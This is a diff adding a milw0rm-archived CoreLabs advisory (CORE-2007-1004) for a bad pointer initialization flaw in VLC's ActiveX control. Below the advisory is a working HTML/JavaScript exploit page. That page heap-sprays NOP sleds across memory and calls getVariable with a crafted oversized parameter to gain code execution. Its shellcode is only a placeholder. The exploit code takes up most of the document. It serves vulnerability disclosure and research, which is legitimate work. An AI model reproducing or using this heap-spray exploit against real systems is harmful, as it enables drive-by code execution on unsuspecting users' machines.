@@ -1,0 +1,68 @@
+<!--
+       Core Security Technologiess - CoreLabs Advisory
+            http://www.coresecurity.com/corelabs
+
+    VLC Activex Bad Pointer Initialization Vulnerability
+
+*Advisory Information*
+Title: VLC Activex Bad Pointer Initialization Vulnerability
+Advisory ID: CORE-2007-1004
+Advisory URL: http://www.coresecurity.com/?action=item&id=2035
+Date published: 2007-12-04
+Date of last update: 2007-12-03
+Vendors contacted: VLC
+Release mode: Coordinated Release
+
+*Vulnerability Description*
+VLC player is a popular multimedia player for various audio and video
+formats, and various streaming protocols.
+
+A vulnerability has been found in the ActiveX control DLL (axvlc.dll)
+used by VLC player. This library contains three methods whose parameters
+are not correctly checked, and may produce a bad initialized pointer. By
+providing these functions specially crafted parameters, an attacker can
+overwrite memory zones and execute arbitrary code.
+
+*Vulnerable packages*
+VLC media player version 0.86, 0.86a, 0.86b y 0.86c.
+-->
+
+<html>
+<head>
+<object classid='clsid:E23FE9C6-778E-49D4-B537-38FCDE4887D8'
+id='target' ></object>
+</head>
+<body>
+   <script>
+      var mm  = null;
+
+      if( target != null )
+      {
+         var param1 = unescape("%u0505%u0505");
+         var salame = "defaultV";
+         var salame2 = 1;
+         var salame3 = 0;
+
+         ag   = unescape("%uCCCC%uCCCC");
+         sh   =
+unescape("%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%");
+         sz   = sh.length * 2;
+         npsz = 0x400000 - (sz + 0x38);
+         nps  = unescape("%u0505%u0505");
+
+         while(nps.length * 2 < npsz) nps += nps;
+         ihbc = (0x0E000000 - 0x400000) / 0x400000;
+         mm   = new Array();
+
+         for(i = 0; i <= ihbc; i++) mm[i] = nps + sh;
+
+         for(var i=0;i<2000;i++)
+            param1 = param1 + unescape("%u0505%u0505");
+					
+         target.getVariable (param1);
+      }
+   </script>
+</body>
+</html>
+
+# milw0rm.com [2007-12-04]
